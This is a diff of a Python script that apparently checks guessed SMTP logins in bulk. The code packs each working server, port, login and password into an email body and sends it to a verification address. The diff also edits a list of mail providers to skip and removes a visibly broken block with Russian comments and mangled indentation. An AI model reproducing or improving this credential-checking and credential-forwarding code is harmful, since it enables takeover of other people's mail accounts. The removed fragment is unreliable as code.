@@ -13,7 +13,7 @@ if not sys.version_info[0] > 2 and not sys.version_info[1] > 8:
 
 sys.stdout.reconfigure(encoding='utf-8')
 # mail providers, where SMTP access is desabled by default
-bad_mail_servers = 'gmail,googlemail,google,yahoo,rocketmail,ymail,outlook,hotmail,msn.com,live.com,live.co.uk,icloud,me.com,mac.com,proton,protonmail'
+bad_mail_servers = 'gmail,googlemail,google,mail.ru,yahoo,qq.com'
 # additional dns servers
 custom_dns_nameservers = '1.1.1.2,1.0.0.2,208.67.222.222,208.67.220.220,1.1.1.1,1.0.0.1,8.8.8.8,8.8.4.4,9.9.9.9,149.112.112.112,185.228.168.9,185.228.169.9,76.76.19.19,76.223.122.150,94.140.14.14,94.140.15.15,84.200.69.80,84.200.70.40,8.26.56.26,8.20.247.20,205.171.3.65,205.171.2.65,195.46.39.39,195.46.39.40,159.89.120.99,134.195.4.2,216.146.35.35,216.146.36.36,45.33.97.5,37.235.1.177,77.88.8.8,77.88.8.1,91.239.100.100,89.233.43.71,80.80.80.80,80.80.81.81,74.82.42.42,,64.6.64.6,64.6.65.6,45.77.165.194,45.32.36.36'.split(',')
 # more dns servers url
@@ -383,18 +383,9 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
 		]
 		body = f'{smtp_server},{port},{smtp_login},{password}'
 		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
-		
-# Проверка успешности для каждого адресата
-for email in verify_emails:
-    try:
-        socket_try_mail(s, smtp_user, email, message_as_str)
-    except Exception as e:
-        raise Exception(f"Failed to send to {email}: {e}")
-
-# Если все отправки успешны, возвращаем True
-    return True
-finally:
-    s.close()
+		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
+	s.close()
+	raise Exception(answer)
 
 def worker_item(jobs_que, results_que):
 	global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
